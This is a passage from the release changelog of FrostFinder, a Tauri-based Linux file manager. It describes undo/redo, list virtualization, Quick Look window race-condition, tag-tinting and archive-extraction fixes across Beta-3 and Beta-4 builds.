**Fix:** Removed all three `import` statements and deleted `getKoraIcon`, `getWhiteSurIcon`, `getNewaitaIcon`, and all three `_MAP` objects. `ICON_THEMES` now only contains `builtin`. `getIcon()` is a single-line builtin lookup. `fileIcon()` has the Newaita folder-variant branch removed. Added a `_REMOVED_BUNDLED_THEMES` Set to migrate any saved theme preference back to `builtin` on first load so existing users don't get stuck in a broken state.

**Files deleted:** `src/icons-kora.js`, `src/icons-whitesur.js`, `src/icons-newaita.js`, `src/icons-kora/` (SVG directory).

**Result:** ~375 KB removed from the JS parse budget on every cold start.

---

### Fix — Undo/redo stack not populated for drag-and-drop, rename, delete, and create (`src/main.js`)

**Root cause:** `pushUndo()` was only ever called in one place — inside `clipboardPaste()` after a batch move/copy completed. The undo stack existed and `undoLastOp()`/`redoLastOp()` had full handling for `'move'`, `'copy'`, `'rename'`, `'delete'`, and `'create'` operations, but none of the other code paths that mutate the filesystem ever called `pushUndo()`. Pressing Ctrl+Z after a drag-drop, rename, delete, or file creation did nothing.

**Fixes — five call sites added:**

**1. Drag-and-drop (`setupDropTarget`):** Added a `file-op-progress` listener running in parallel with the existing `ddDone` listener. It accumulates `{src, dst, srcDir, dstDir}` items as each file completes. After `ddDone` resolves, calls `pushUndo({op:'move'|'copy', items:ddUndoItems})`. Both the existing `ddUnlisten` and the new `ddUnlistenProgress` are cleaned up together.

**2. `deleteEntries`:** Rewrote the loop to collect entries that were successfully trashed (vs those that threw). Calls `pushUndo({op:'delete', items:deleted})` after the loop. `op:'delete'` undo is intentionally a no-op in `undoLastOp` (can't restore from Trash programmatically) — but the item is now on the stack so the user gets a "Cannot undo delete" toast rather than silent confusion.

**3. `promptCreate`:** Calls `pushUndo({op:'create', items:[{dst, srcDir, newName}]})` in the `.then()` success handler. Undo deletes the created file/folder via `delete_items`.

**4. `promptCreateDoc`:** Same pattern as `promptCreate`.

**5. `startRename` (both code paths):** The prompt fallback (`prompt()`) and the inline contenteditable path both now call `pushUndo({op:'rename', items:[{src, dst, oldName, newName}]})` after a successful `rename_file` invoke. Undo calls `rename_file` with the old name; redo calls it back with the new name.

---

### Fix — Undo/redo stacks lost on tab switch (`src/main.js`)

**Root cause:** `makeTabState()` did not include `_undoStack` or `_redoStack` fields, and `syncState()` did not list them in its `keys` array. Each tab therefore shared the single global `state._undoStack`/`state._redoStack` object reference but `syncState()` never wrote the current stacks back to the tab's saved state. When `switchTab()` called `Object.assign(state, ts)`, the undo stacks were wiped to empty (the default in `makeTabState`). Any undo history accumulated in one tab was destroyed the moment the user switched to another tab and back.

**Fix:** Added `_undoStack:[]` and `_redoStack:[]` to `makeTabState()`. Added `'_undoStack'` and `'_redoStack'` to the `keys` array in `syncState()`. Undo history is now per-tab and survives tab switching.

---

## What's in Beta-4-r12 through Beta-4-r15

**No Rust recompile needed.** JS-only changes (`src/views.js`).

### Fix — Navigating to large directories stalls the app — all three list renderers virtualized (`src/views.js`)

Large directories (e.g. `/home/jay/Music` with 893 entries) caused multi-hundred-millisecond hangs on every navigation and render. All three renderers were building full DOM node sets synchronously regardless of directory size.

#### Gallery strip — virtual horizontal scroller (r12)

**Root cause:** `renderGalleryView` built the strip via `entries.map(...).join('')` → `innerHTML`. 893 entries = 893 synchronous DOM nodes, 893 `fileIcon()` calls, 893 `escHtml()` calls, immediate layout for all of them. Total UI-thread cost: ~37 ms on every gallery navigation to Music.

**Fix:** `_makeGthumb`, `_paintStrip`, `_scrollToSel` added. Strip `<div>` is `position:relative; width:_stripTotalW(n)px`. Only the visible window (~12 items at typical viewport) is ever in the DOM. A `scroll` listener repaints as the user scrolls. On incremental update, only `.sel` toggling + `_scrollToSel` in rAF.

#### Column view — virtual vertical scroller (r12)

**Root cause:** `colList.innerHTML = entries.map(...).join('')` created all rows in one write, then `colList.querySelectorAll('.frow').forEach(...)` attached N×3 event listeners. 893 entries = 2,679 event listeners registered synchronously before first paint.

**Fix:** `_colSpacer` div sets total scroll height (`entries.length × 28px`). `_paintColList()` renders only the visible window (viewport ÷ 28px + 6 overscan each side). Rows are `position:absolute; top: ei × 28px`. Event delegation (one `click`/`dblclick`/`contextmenu` per `colList`) replaces per-row listeners. `ResizeObserver` repaints on column width change. `rAF` scroll-to-selected on initial render when `col.selIdx >= 0`.

#### List view — virtual vertical scroller, table-spacer approach (r12)

**Root cause:** `entries.map(...).join('')` → `tbody.innerHTML`, then per-row listeners via `querySelectorAll('.list-row').forEach(...)`.

**Fix:** Two sentinel `<tr class="lv-spacer">` rows hold total scroll height as inline `height` CSS. `_makeLvRow` / `_paintLv` add/remove rows around the spacers. `LV_ROW_H` starts at 29px then is measured from the first rendered row after initial `rAF` — always accurate regardless of CSS font/padding changes. Event delegation on `lvWrap`.

### Fix — `sel._e` not set before `sel.set(i)` in gallery strip click handler (r12)

When arriving in gallery view from column view, `sel._e` still pointed at the column entry array. `sel.set(i)` resolved an undefined or wrong path — breaking context menus and cut/copy. Fixed in the strip click handler, list view click handler, and list view contextmenu handler.

### Fix — `_setupThumbObserver` redundant scroll fallback removed (r12)

With the virtual strip, only visible items are in the DOM and already observed by `thumbObserver`. The old 80ms post-scroll `_loadGthumb` sweep was redundant and could trigger unnecessary IPC. Removed. `_setupThumbObserver` now accepts an explicit `stripWrap` parameter.

---

## What's in Beta-4-r8 through Beta-4-r11

**No Rust recompile needed.** JS-only changes (`src/utils.js`).

### Feature — Tab system (`src/main.js`)

Full multi-tab navigation. `makeTabState()` creates isolated per-tab state objects (column stack, selection, history, view mode, sort, tags, undo stacks). `newTab(path)`, `closeTab(id)`, `switchTab(id)` manage the tab array. `syncState()` flushes current `state` back to the active tab before every switch. `renderTabs()` builds the tab bar DOM with close buttons and a `+` button. Keyboard shortcuts: Ctrl+T (new tab), Ctrl+W (close tab), Ctrl+Tab / Ctrl+Shift+Tab (next/previous tab). Tab labels update to the last path component of the current directory.

### Feature — Undo/redo stack (`src/main.js`)

`pushUndo({op, items})` records up to 50 operations. `undoLastOp()` reverses the most recent operation: move → move back, copy → delete copy, rename → rename back, create → delete. `redoLastOp()` re-applies. Keyboard shortcuts: Ctrl+Z (undo), Ctrl+Y / Ctrl+Shift+Z (redo). Full per-operation coverage added in r16 (see above).

### Feature — Breadcrumb overflow ellipsis menu (`src/main.js`)

When the path is too long for the breadcrumb bar, an ellipsis `…` button appears. Clicking it opens a popup listing the hidden path segments. `enterBcEditMode()` / `exitBcEditMode()` allow typing a path directly. Ctrl+L focuses the breadcrumb for keyboard navigation.

### Feature — Trash banner (`src/main.js`, `src/style.css`)

When the current directory is `~/.local/share/Trash/files`, a `#trash-banner` strip appears above the file list with an "Empty Trash" button. `renderTrashBanner()` shows/hides the banner based on `state.currentPath`.

### Feature — Inotify-based filesystem watcher (`src-tauri/src/main.rs`, `src/main.js`)

`watch_dir` uses the `notify` crate (inotify on Linux) to watch the current directory for create/modify/delete/rename events. Events are debounced 300ms before emitting `"dir-changed"` to JS. `unwatch_dir` stops the watcher. JS calls `watch_dir` at the end of every `navigate()` and listens for `"dir-changed"` to call `refreshColumns()`. Replaces the previous mtime-polling approach which fired spurious renders on every navigate.

### Feature — `refreshColumns()` (`src/main.js`)

In-place column refresh after drag-and-drop — re-fetches and re-renders all open columns without destroying the column layout or scroll position. Previously, DnD triggered a full `navigate()` which collapsed all open columns back to a single column.

---

## What's in Beta-4-r7

**No Rust recompile needed.** JS-only fix.

### Bug — Vite parse error: `loadTagsForEntries` had a duplicated body with a dangling `catch` (`src/main.js`)

**Root cause:** The function body of `loadTagsForEntries` was accidentally duplicated — likely from a bad edit or merge conflict. The first copy of the body was complete and correct (ending with `}catch(e){}`), but the duplicate was appended immediately after with no wrapping `try{`. This left a bare `}catch(e){}` at function scope with no matching `try`, which is a pure syntax error. Vite's `import-analysis` plugin (which uses `es-module-lexer`) failed to parse the file and refused to serve it, causing a blank/non-functional app on startup.

**Fix:** Removed the duplicated portion entirely. The function now has a single, correct `try/catch` block, ending cleanly before `async function refreshTagColors`.

### Bug — Quick Look window never showed content after first open (`src/views.js`)

**Root cause:** `listen()` (Tauri event subscription) is async — it does a round-trip to the Tauri backend to register the listener. In the old `initQuickLook`, `listen('ql-ready', ...)` and `listen('ql-closed', ...)` were called **after** `new WebviewWindow(...)`. Because the window starts loading immediately on construction, `ql.html` could fire `ql-ready` before the `await listen(...)` call in the main window resolved. The event landed in nothing, `_qlReady` stayed `false` forever, `_qlPendingPayload` was never flushed to the window, and the QL window displayed blank content on every open after the first.

**Fix:** Both `await listen('ql-ready', ...)` and `await listen('ql-closed', ...)` are now registered **before** `new WebviewWindow(...)` is called. This guarantees the Tauri backend has live subscriptions before the window process can emit any events.

---

## What's in Beta-4-r5

### Feature — Folder preview panel shows full information

Clicking a folder now shows a proper info panel in the preview sidebar, matching the macOS Finder-style layout: large folder icon, folder name, folder size, and an **Information** section with Created, Modified, Last Opened dates, permissions, and Tags.

**Changes:**

`src-tauri/src/main.rs` — Added `created: Option<u64>` and `accessed: Option<u64>` to `FileEntry`. Both fields are populated in `build_file_entry` using `real_meta.created()` and `real_meta.accessed()` respectively. Both are `Option` because Linux filesystems don't always expose birth time (`created`) depending on the filesystem type (ext4 on older kernels, tmpfs, etc.) — `None` is serialised as `null` and the JS template simply omits those rows.

`src/views.js` — The folder branch of `renderPreview` now renders a two-phase panel. The panel appears immediately with the folder icon, name, and all available metadata (Created, Modified, Last Opened, Permissions, Tags). A non-blocking `invoke('get_dir_size')` call runs in parallel; when it resolves, the panel re-renders with the real size appended to the kind line (e.g. `Folder · 49.2 MB`). The re-render is guarded by `state.previewEntry === e` so it's a no-op if the user has already navigated away. Long-form date formatting uses `toLocaleDateString('en-GB', {day:'numeric', month:'long', ...})` to match the screenshot style.

`src/style.css` — Added `.pv-folder-header` (larger padding for folder header), `.pv-folder-icon` (drop-shadow on folder SVG), and `.pv-section-title` (the "Information" section heading with uppercase letter-spacing).

---

## What's in Beta-4-r42

### Bug fix — Tag row color tinting not appearing (all views)

Tag row tinting added in r3 was visually absent in all views. Three separate root causes:

**Root cause 1 — Icon view: `background: transparent !important` beat inline styles**

`.icon-item` in `style.css` has `background: transparent !important` to prevent a WebKit2GTK bug where GPU-composited icon backgrounds would "ghost" as black squares on Mesa/CachyOS. In CSS, `!important` in a stylesheet rule overrides even inline `style=""` attributes — so setting `background: #color33` in the element's inline style had no effect at all.

Fix: Changed `.icon-item` to `background: var(--tag-tint, transparent) !important`. The CSS custom property `--tag-tint` is set via `style.cssText` on tagged items (e.g. `--tag-tint: #f8717133`). Because the `!important` rule now reads its value from a CSS var that can be overridden per-element via inline custom property assignment, the tint shows through. Untagged items fall back to `transparent`. The ghost-prevention behaviour is fully preserved.

**Root cause 2 — List view: CSS custom properties not reliably inherited through `<tr>` → `<td>` in WebKit2GTK**

r3 set `--row-tag-bg` on the `<tr>` element and relied on CSS custom property inheritance to reach `<td>`. Standard CSS says custom properties are inherited, but WebKit2GTK's table layout model handles `<tr>` as an anonymous box and inheritance through `<tr>` → `<td>` is unreliable in this engine — especially combined with `contain: layout style paint` on `.list-row`.

Fix: Dropped the CSS var approach entirely. `tdBg` is now computed per row as `` `style="background:${tagColor(_rowTag)}33"` `` and applied directly inline to every `<td>` in the row template. Applied in both the regular list view and the search-results flat list view. Selected rows skip the tint (`_rowTag` is `null` when `isSel` is true) so the blue selection background is not affected.

**Root cause 3 — Column view: `contain: layout style paint` may block CSS var resolution**

`.frow` also has `contain: layout style paint`. The r3 CSS rule `background: var(--row-tag-bg, transparent)` on `.frow` with `--row-tag-bg` set inline on the same element should theoretically work, but `contain: style` creates an isolated style scope which some WebKit builds treat as blocking external custom-property resolution even from the element's own inline style.

Fix: Same direct approach — background is now applied as a literal `style="background:#color33"` attribute on the `<div class="frow">` itself, only when the row is not already in a selected/hovered state. The `.frow:hover` and `.frow.sel` CSS rules continue to override cleanly via normal cascade specificity.

---

## What's in Beta-4-r3

### 2 features added

**Feature 1 — Tag row color tinting (all views)**

Tagged files and folders now have their row visually tinted with the tag's color across all four views: column view, list view (including search results), and icon view.

Implementation uses CSS custom properties (`--row-tag-bg`) so the tint is a base-layer style that existing state rules (`.sel`, `:hover`, `.cut-item`) cleanly override at higher specificity — no `!important` hacks needed.

- **Column view** (`views.js`): The `frow` div template now computes the first tag for each entry inline during `innerHTML` generation and emits `style="--row-tag-bg: <color>33"` on tagged rows. `.frow` base rule updated from no background to `background: var(--row-tag-bg, transparent)` in `style.css`.
- **List view — regular** (`views.js`): `<tr class="list-row">` gets `style="--row-tag-bg: <color>33"` for tagged entries. `.list-row td` base rule updated to `background: var(--row-tag-bg, transparent)` — inherits the CSS var from the `<tr>` parent. Hover and selected `td` rules override cleanly.
- **List view — search results** (`views.js`): Same `--row-tag-bg` treatment applied to the flat/search results list `<tr>` template.
- **Icon view** (`views.js`): Non-selected tagged icon items get `background: <color>33` injected into their inline `style.cssText`. Selected items keep the blue selection background as before. The tint is cleared on selection and restored on deselection via the existing selection logic.

Alpha value `0x33` (20%) used for all views — visible enough to identify at a glance, subtle enough not to obscure text or icons.

**Feature 2 — Debug log 💾 button now opens a native save dialog**

Previously the 💾 button in the debug log panel used `<a download>` which silently dumped the log to the browser's default downloads folder without any prompt.

`download()` rewritten as `async` and now uses `@tauri-apps/api/dialog` (`save()`) + `@tauri-apps/api/fs` (`writeTextFile()`) to open the OS-native file chooser. The user picks any location and filename before saving. The dialog pre-fills `frostfinder-debug-<timestamp>.log` and offers `.log`, `.txt`, and all-files filter options.

`tauri.conf.json` allowlist updated: `dialog.save` and `fs.writeFile` (scoped to `**`) enabled. Two new imports added to the top of `main.js`.

---

## What's in Beta-4-r2

### 3 bugs fixed

**Bug 1 — ql-window.js — Space bar would not close QL window while audio/video was playing**

The Space keydown handler in `ql-window.js` checked whether a media element was actively playing (`!el.paused && !el.ended && el.readyState > 2`). If media was playing, it fell through without calling `closeWindow()`, relying on native browser play/pause behaviour. However, if the media element was not focused (e.g. the user had clicked elsewhere in the QL chrome), the Space event had no native target and the window neither closed nor paused — the key did nothing.

Fix: removed the media-playing guard entirely. Space now unconditionally calls `closeWindow()`. `closeWindow()` calls `stopAllMedia()` first, which pauses and clears all `<audio>`/`<video>` elements before hiding the window. This is consistent and safe — media is always stopped on close regardless of trigger.

**Bug 2 — main.rs — App froze when extracting files after long use (blocking thread exhaustion)**

`extract_archive` called `tauri::async_runtime::spawn_blocking` with no guard against concurrent calls. If the user triggered a second extraction while one was already running (or triggered repeated extractions rapidly over a long session), each call occupied a Tokio blocking thread for the full extraction duration. Over time, threads accumulated and the Tokio blocking thread pool became saturated, causing the entire async runtime — and with it the UI — to freeze.

Fix: added `EXTRACT_IN_PROGRESS: AtomicBool`. `extract_archive` uses `compare_exchange` to claim the flag before spawning the blocking thread. If a second extraction is attempted while one is running, it returns a clear user-visible error immediately instead of queuing another thread. The flag is reset unconditionally in both the success and `map_err` paths.

**Bug 3 — main.rs — `which` subprocess spawned on every extraction (wasted syscalls + slow startup on tar-format archives)**

`_extract_archive_sync` called `std::process::Command::new("which")` twice on every extraction for tar-based formats to locate the `bsdtar` / `tar` binary. These synchronous subprocess spawns happen inside the blocking thread, adding unnecessary overhead on every call and repeatedly thrashing the process table on systems where extractions are frequent.

Fix: added `TAR_BIN: OnceLock<Option<String>>` and a `find_tar_bin()` helper. The `which` probe runs exactly once on the first tar-based extraction and the result is cached for the lifetime of the process. Also added `std::thread::yield_now()` every 64 entries in the ZIP extraction loop so the blocking thread cooperates with the OS scheduler during large archives.

---

## What's in Beta-4-r1

### Full codebase audit — 8 bugs fixed

Complete line-by-line review of all source files (main.js, views.js, ql-window.js, utils.js, ql.html). Eight issues found and fixed:

**Bug 1 — main.js:182 — Stale version string in debug log download**
The FF debug log download header still said `β1-r39`. Updated to `FrostFinder Beta Build`.

**Bug 2 — main.js:521 — Directory auto-refresh destroyed column stack**
`startWatching()` called `refreshCurrent()` when the directory's mtime changed on disk. `refreshCurrent()` calls `navigate(currentPath, 0)` which resets `state.columns` to a single entry — blowing up the column layout every 2 seconds any time another app touched a file in the current folder. Fixed: call `refreshColumns()` instead.

**Bug 3 — main.js:1843 — Dead `isTrash` variable in renderTrashBanner()**
A variable `isTrash` was computed with a multi-clause condition but never used. The real check was `trashRoot` (the very next line). The dead variable also had an operator-precedence ambiguity (`||` vs `&&` without parens). Removed the dead variable.

**Bug 4 — ql-window.js:258 — Missing `_ff_stopped` guard in error-path transcode stall timer**
The three `_ff_stopped` guards added in r43 (outer stall timer, inner stall timer, error handler) missed one case: the inner `setTimeout` created *inside the error handler* when transcoding is triggered by a codec error. If the window closes while that timer is pending, it would call `_showMpvFallback()` on a hidden window's DOM. Added the missing guard.

**Bug 5 — ql-window.js:414 — Space always closed QL even during active playback**
The QL keydown handler closed the window on Space unconditionally. If the user had audio or video playing and pressed Space expecting pause/play, the window closed instead. Fixed: Space now only closes if no media element is actively playing (`!el.paused && !el.ended && el.readyState > 2`). If media is playing, Space falls through to the browser's native pause handler.

**Bug 6 — views.js:848 — Rubber-band selection: cssText.replace() on every mousemove**
The rubber-band `onMove` handler read `band.style.cssText`, ran a regex replace to strip old position properties, then set individual properties. Reading `cssText` forces style resolution; the replace + reassign re-parses all styles — on every pointer move event. Removed the redundant `cssText.replace()` line. Individual property assignments (`band.style.left = ...`) correctly override any existing value without needing the strip.

**Bug 7 — views.js:1603 — Gallery zoom keydown listener leaked on every directory navigation**
The zoom `+/-/0` keydown listener was added with `document.addEventListener('keydown', function _gzKey(e){...})` — a named function expression with no stored reference. The guard `host._gzKeyBound` prevented duplicates within a single directory, but on full rebuild (new directory), `host._gzKeyBound` was reset to `false` and a new anonymous listener was added — the old one was never removed. After navigating 10 directories in gallery view, 10 zoom listeners were active simultaneously. Fixed: listener stored as `host._gzKeyFn`, removed via `document.removeEventListener` before each full rebuild.

**Bug 8 — views.js:2174 — quickLookNavigate() was a broken stub returning `!!_qlWin`**
The exported `quickLookNavigate(dir)` function returned `!!_qlWin` and did nothing with its `dir` argument. It was imported in main.js but never called. Replaced the misleading return value with a proper no-op stub and explanatory comment.

---

## What's in Beta-3-r43

### Bug fix — Video continues playing in background after QL is closed
**Root cause:** `stopAllMedia()` correctly calls `el.pause(); el.src = ''; el.load()` — but setting `src` to an empty string on a playing `<video>` element fires the `error` event. The `error` listener inside `renderEntry` responds by switching to the ffmpeg transcode URL and calling `vid.play()`, restarting playback inside the hidden window. The stall detection `setTimeout` callbacks have the same problem — if they fire after `hide()`, they also set a new src and call `play()`.

**Fix:** A `_ff_stopped` boolean flag is set on each element by `stopAllMedia()` *before* clearing its `src`. Four guards added:
1. `stopAllMedia()` — sets `el._ff_stopped = true` before `el.src = ''`
2. Outer stall timer (5 s) — `if (vid._ff_stopped) return`
3. Inner stall timer (transcode 20 s fallback) — same guard
4. `error` event handler — `if (vid._ff_stopped) return` (this is the primary path that was restarting playback)

All four guards are needed because any of these async callbacks can fire after `hide()` if the window was closed while a video was loading or buffering.

---

## What's in Beta-3-r42

### Bug fix — Quick Look window shows blank content (root cause: missing ql.html)
After comparing r41 with the working r11 build, the actual root cause is that `ql.html` was simply absent from the r40 diagnostic zip that r41 was built from. Vite's config declares `ql.html` as a second MPA entry point; the `WebviewWindow` loads it by URL (`'ql.html'`). Without the file the QL window gets a blank/404 page every time — no DOM, no script, no `ql-ready` event, nothing.

The `listen()` await fix applied in r41 was correct and has been kept, but it was treating a symptom (no `ql-ready` ever firing) rather than the root cause (no page to fire it from).

**Fix:** `ql.html` restored from the r11 working build. Content is identical to r11 — full window shell, title bar, nav buttons, body container, and `<script type="module" src="/src/ql-window.js">`. Compatible with r41/r42's `ql-window.js` which is a strict superset of r11's (adds `stopAllMedia()` only).

---

## What's in Beta-3-r41

### Bug fix — Quick Look fires up blank (no content shown)
**Root cause:** `listen()` in Tauri v1 is async — it requires a round-trip to the backend to register the subscription. In `initQuickLook()`, both `listen('ql-ready', ...)` and `listen('ql-closed', ...)` were called **without `await`**, then `new WebviewWindow(...)` was called immediately after. Because ql.html is small and pre-warm loads it fast, `ql-ready` fired from ql.html before either listener was registered in the main window. The event landed in nothing. `_qlReady` stayed `false` forever.

Consequence: every Space press took the `PENDING_PATH` branch, stored the payload, showed the window — but the `ql-ready` flush that was supposed to call `ql-update` never fired. ql.html called `get_ql_payload()` on its own init (which cleared the Rust store), but by then the update event was already missed, so it rendered with an empty/stale payload — blank window.

Confirmed by the diagnostic log: `QL_READY_FIRED` never appears in 37 seconds across two Space presses.

**Fix 1 — await listeners before creating the window:**
Both `listen('ql-ready')` and `listen('ql-closed')` are now `await`ed before `new WebviewWindow(...)`. This guarantees the subscriptions are live before ql.html can possibly emit anything.

**Fix 2 — belt-and-suspenders `ql-update` after `show()`:**
After `_qlWin.show()` resolves, an unconditional `emit('ql-update', {})` is sent. By the time `show()` resolves, ql.html's `listen('ql-update')` is always registered (ql.html registers it before emitting `ql-ready`). This ensures the window gets its content even in edge cases where `ql-ready` is still somehow missed.

### Title bar rename
Window title changed from `FrostFinder β1-r39` to **`FrostFinder Beta Build`** in both `tauri.conf.json` and `index.html`.

---

## What's in Beta-3-r12

**Rust recompile required.**

### Bug 1 — App won't quit after closing the main window (`src-tauri/src/main.rs`)

**Root cause:** The Quick Look window is intentionally kept alive in a hidden state (using `appWindow.hide()` instead of `appWindow.close()`) so it can be shown instantly the next time the user presses Space. This means Tauri's built-in "exit when the last window closes" logic never fires — after the user closes the main FrostFinder window, the hidden QL WebviewWindow keeps the entire process running forever. The app appeared to close (window gone, no taskbar entry) but remained as a zombie process consuming memory.

**Fix:** Added `.on_window_event(...)` to the Tauri builder in `main()`. When the event is `WindowEvent::Destroyed` and the window label is `"main"`, `app_handle.exit(0)` is called. This explicitly terminates all windows (including the hidden QL window) and the Rust process cleanly. The handler only fires for the main window — destroying the QL window itself does not re-trigger.

### Bug 2 — Audio keeps playing after Quick Look is closed (`src/ql-window.js`)

**Root cause:** `closeWindow()` called `appWindow.hide()` to hide the QL WebViewWindow, but never paused the `<audio>` element. The browser does not automatically pause or stop media elements when a window is hidden — the audio pipeline keeps running in the hidden WebView, producing sound with no visible player and no way to stop it.

A secondary instance of the same bug: `renderEntry()` called `qlBody.innerHTML = ''` before building each new file's content. This removes audio/video DOM nodes, but browsers intentionally keep detached media elements playing. Navigating between audio files in QL could leave the previous track's decoder running in the background.

**Fix:** Added `stopAllMedia()` helper that:
1. Pauses every `<audio>` and `<video>` element in `qlBody`
2. Clears `src` and calls `load()` to flush the decoder buffer immediately
3. Cancels the audio visualizer animation frame (`_vizAnimId`)

`stopAllMedia()` is now called in two places:
- At the top of `closeWindow()` — before `appWindow.hide()`, so audio stops the instant the window is dismissed.
- At the top of `renderEntry()` — before `qlBody.innerHTML = ''`, so previous-file audio stops before new content is loaded.

---

## What's in Beta-3-r11

No Rust recompile needed. Four bugs introduced in r10 fixed.

### Bug 1 — QL window was still destroyed on close, killing the pre-warm (`src/ql-window.js`)

`closeWindow()` in `ql-window.js` called `appWindow.close()`. This destroyed the WebViewWindow process. `_qlWin` in `views.js` still held the stale reference, so `_qlWin` was non-null but dead. The next Space press skipped `initQuickLook()` (because `!_qlWin` was false), called `show()` on a destroyed window, and silently failed — QL never appeared again after the first dismiss.

**Fix:** `appWindow.close()` → `appWindow.hide().catch(()=>{})`.

### Bug 2 — `navigate` was undefined in list view dblclick (`src/views.js`)

`renderListView`'s destructuring didn't include `navigate`. The new dblclick handler `if(entry.is_dir) navigate(entry.path, 0)` called an undefined function, throwing a `ReferenceError` on every folder double-click.

**Fix:** Added `navigate` to `renderListView`'s `const {...} = d()` destructuring.

### Bug 3 — `ql-closed` emit direction was wrong (`src/views.js`)

`closeQuickLook()` (called by main on Escape/Space-toggle) emitted `'ql-closed'`, which triggered the listener inside `initQuickLook`, which called `_qlWin.hide()` a second time. `'ql-closed'` is a ql→main event; main should never emit it.

**Fix:** Removed `emit('ql-closed')` from `closeQuickLook()`. It now just sets `_qlVisible=false` and calls `_qlWin.hide()` directly.

### Bug 4 — `ql-update` listener registered after `ql-ready` emitted (`src/ql-window.js`)

`init()` in `ql-window.js` called `emit('ql-ready')` before `listen('ql-update')`. Main's `ql-ready` handler fires `ql-update` immediately to flush a pending payload. If QL hadn't registered the `ql-update` listener yet (it hadn't), the event landed with no handler — the pending payload was silently dropped and QL showed blank content on the very first open.

**Fix:** Swapped order: `await listen('ql-update', …)` is now registered **before** `await emit('ql-ready', …)`.

### Also: double-init guard on `initQuickLook` (`src/views.js`)

Added `if (_qlWin) return;` at the top of `initQuickLook()` so the fallback path inside `openQuickLook` can never register duplicate `ql-ready`/`ql-closed` listeners.

---

## What's in Beta-3-r10

No Rust recompile needed.

### Fix: Quick Look launches instantly (`src/views.js`, `src/ql-window.js`, `src/main.js`)

**Root cause:** Every Space press called `new WebviewWindow('quicklook', …)`, which spawns a new OS-level WebKit process from scratch. On a typical system this takes 400–700ms before the window appears. No amount of JS optimisation could fix this — the delay is OS process startup time.

**Fix — pre-warm architecture:**

- `initQuickLook()` is called at app startup (parallel to sidebar/file loading) and creates the QL window with `visible: false`. WebKit initialises silently in the background.
- `ql-window.js` emits `'ql-ready'` once it has loaded and registered all listeners.
- When the user presses Space, `openQuickLook()` sets the payload and calls `_qlWin.show()` — the WebKit process is already running, so the window appears immediately.
- Closing QL calls `_qlWin.hide()` instead of `_qlWin.close()`, keeping the process alive for next time.
- If a payload arrives before QL is ready (rare race on very fast first keypress), `_qlPendingPayload` stores it and `ql-ready` flushes it via `ql-update`.

### Feature: Double-click to enter folders in icon view and list view (`src/views.js`, `src/main.js`)

Previously, single-clicking a folder in icon or list view immediately navigated into it. This made multi-select, drag-and-drop, and just looking at folder metadata frustrating since any misclick caused navigation.

**New behaviour:**
- **Icon view / List view / Search results:** single click selects and shows folder preview; **double-click navigates**.
- **Column view:** unchanged — single-click still opens the next column (that's the column paradigm).
- `handleEntryClick` no longer calls `navigate` for non-column views when a directory is clicked.
- All dblclick handlers updated: `if(entry.is_dir) navigate(entry.path, 0); else invoke('open_file', …)`.

---

## What's in Beta-3-r9

No Rust recompile needed. Full code audit — 8 bugs fixed.

### Bug 1 — List view column sort did nothing (`src/views.js`, `src/main.js`)

**Root cause:** `sortEntries()` contained `state.listSort={col,dir}`, which overwrote `state.listSort` with the global `sortState` values every time it was called. The list view header click correctly set `state.listSort.col='date'`, but then the very next line called `renderListView()`, which called `sortEntries()`, which immediately set `state.listSort` back to the global sort. The arrows showed the wrong column and the sort order never changed.

**Fix:** Removed `state.listSort=...` from `sortEntries()`. Rewrote `renderListView` to sort entries inline using `state.listSort` directly, with `sortState.foldersFirst` for the folders-first preference. `sortState` is now injected via `injectDeps`. List view and global sort (column/icon/gallery) are now fully independent.

### Bug 2 — Shift/Ctrl-click in search results selected wrong files (`src/views.js`)

**Root cause:** `handleEntryClick(entry, i, ev)` performs `sel.range(sel.last, idx)` and `sel.toggle(idx)`, which use `sel._e[idx]?.path`. `renderFlatList` renders rows sorted by `sorted[]`, so `i` is an index into `sorted`. But `sel._e` was left pointing at whatever `getVisibleEntries()` set it to — the unsorted `state.searchResults`. Index `i` into unsorted results is a different file than index `i` into `sorted`. Multi-select always targeted the wrong files.

**Fix:** `sel._e = sorted` is now set before attaching row event listeners.

### Bug 3 — Search results showed hidden files when "Show Hidden" was off (`src/views.js`)

**Root cause:** `renderFlatList` was called with raw `state.searchResults`, which may include hidden files. The function never applied the `showHidden` filter. `getVisibleEntries()` does filter hidden files for search mode, but `renderFlatList` bypasses that.

**Fix:** Added `if(!state.showHidden) entries=entries.filter(x=>!x.is_hidden)` at the start of `renderFlatList`, before the empty check.

### Bug 4 — Sidebar item click guard never fired (`src/main.js`)

**Root cause:** Operator precedence bug: `!item.dataset.path===undefined`. JS evaluates `!item.dataset.path` first (a boolean), then checks `=== undefined` (always `false`). The guard was dead code — items without a `data-path` attribute were never caught and caused `navigate(undefined)` calls.

**Fix:** `if(!item || !item.dataset.path) return;`

### Bugs 5–8 — Filenames with `<`, `>`, or `&` broke the DOM in 4 places (`src/views.js`)

Files named `foo<bar>`, `a&b`, or `"quote"` were injected raw into `innerHTML` strings in:
- Column view `.fname` span (Bug 5)
- List view `.cell-name-text` span (Bug 6) 
- Gallery view audio name and doc-preview fallback name (Bug 7)
- Lightbox caption (Bug 8)

**Fix:** All four now use `escHtml(e.name)` / `escHtml(sel_e.name)`.

---

## What's in Beta-3-r8

No Rust recompile needed.

### Feature: Search results — resizable columns, sortable headers, drag-and-drop (`src/views.js`, `src/main.js`)

`renderFlatList` (used for search and tag results) was a bare read-only table. Rebuilt to match list view quality:

**Resizable columns:** All five columns (Name, Location, Date Modified, Size, Kind) have drag-to-resize handles, stored under `sr-name`/`sr-loc`/`sr-date`/`sr-size`/`sr-kind` in `state.colWidths`. Widths persist across searches and tab switches. Default widths: Name 260, Location 220, Date 160, Size 80, Kind 90.

**Sortable headers:** Click any column header to sort; click again to reverse. Sort state stored in `state.searchSort` (persists per tab). Defaults to name ascending.

**Drag-and-drop:** `setupDragDrop` and `setupDropTarget` now wired on every row, matching list/column view. Files can be dragged out of search results to any folder drop target. Directory rows in results accept drops.

**Other fixes in the old flat list:**
- Name cell was `${e.name}` bare text — now wrapped in `<span class="cell-name-text">` so inline rename selector (`.cell-name-text`) matches correctly.
- Names now go through `escHtml()` — filenames with `<`, `>`, `&` were rendering as broken HTML.
- Location column had a hardcoded `max-width:200px` inline style — replaced by the resizable column system.
- `cut-item` class was missing — cut files now show the correct dimmed style.
- Background context menu (right-click on empty space) now works.
- Click on empty space deselects all.

---

## What's in Beta-3-r7

No Rust recompile needed.

### Fix: DnD still broken in column view — 200ms hold timer fired during drag pause (`src/views.js`)

